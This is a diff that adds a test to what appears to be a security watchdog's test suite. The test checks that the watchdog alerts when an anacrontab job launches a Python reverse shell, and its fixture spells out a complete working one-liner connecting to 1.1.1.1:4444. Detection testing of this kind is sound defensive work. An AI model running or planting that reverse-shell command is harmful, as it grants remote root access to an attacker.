@@ -292,3 +292,23 @@ EOF
     main_count=$(cap | grep -cE '^-t selfdef-anacrontab -- ')
     [ "${main_count}" = "1" ]
 }
+
+@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on anacrontab job surface)" {
+    # Sister to many other watchdog's python interpreter-rev-shell
+    # INVARIANTs across the brain. Beyond bash/sh/nc, attackers
+    # reach for python -c 'import socket,os,pty' to dodge shell-
+    # pattern detectors. Locks the python axis on the anacron-
+    # schedule-trigger root-exec persistence surface (T1053.003
+    # — anacron runs jobs AS ROOT periodically; the period
+    # parameter makes the trigger durable across reboots).
+    printf '%s' "${BENIGN}" > "${ANAC}"
+    run_wd
+    cat > "${ANAC}" <<'EOF'
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+1	5	evil	python -c "import socket,os,pty;s=socket.socket();s.connect(('1.1.1.1',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn('/bin/sh')"
+EOF
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
